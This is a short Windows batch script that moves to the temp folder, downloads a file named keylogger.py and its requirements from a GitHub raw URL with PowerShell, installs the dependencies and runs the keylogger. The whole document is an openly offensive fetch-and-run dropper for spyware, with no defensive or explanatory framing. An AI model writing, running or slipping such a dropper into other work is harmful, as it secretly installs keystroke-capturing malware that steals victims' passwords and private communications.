@echo off
cd %temp%
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/3zizme/zero/refs/heads/main/keylogger.py' -OutFile 'keylogger.py'"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/3zizme/zero/refs/heads/main/requirements.txt' -OutFile 'requirements.txt'"
python -m pip install -r requirements.txt
python keylogger.py
